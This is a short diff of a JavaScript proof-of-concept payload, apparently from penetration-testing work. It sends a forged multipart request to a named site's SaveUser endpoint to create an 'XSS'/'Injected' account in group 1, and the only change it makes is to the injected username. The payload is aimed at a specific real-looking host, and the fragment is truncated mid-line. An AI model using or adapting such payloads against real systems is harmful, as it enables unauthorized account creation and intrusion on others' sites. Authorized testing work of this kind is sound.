@@ -7,7 +7,7 @@ fetch('https://cms.sipradi.com.np/Setup/Security/SaveUser', {
   body: `------WebKitFormBoundaryVAPT
 Content-Disposition: form-data; name="jsonData"
 
-{"UserId":0,"GroupId":1,"FirstName":"XSS","LastName":"User","Designation":"Injected","UserName":"xss_>
+{"UserId":0,"GroupId":1,"FirstName":"XSS","LastName":"User","Designation":"Injected","UserName":"sankxss>
 ------WebKitFormBoundaryVAPT--`
 })
 .then(res => res.text())
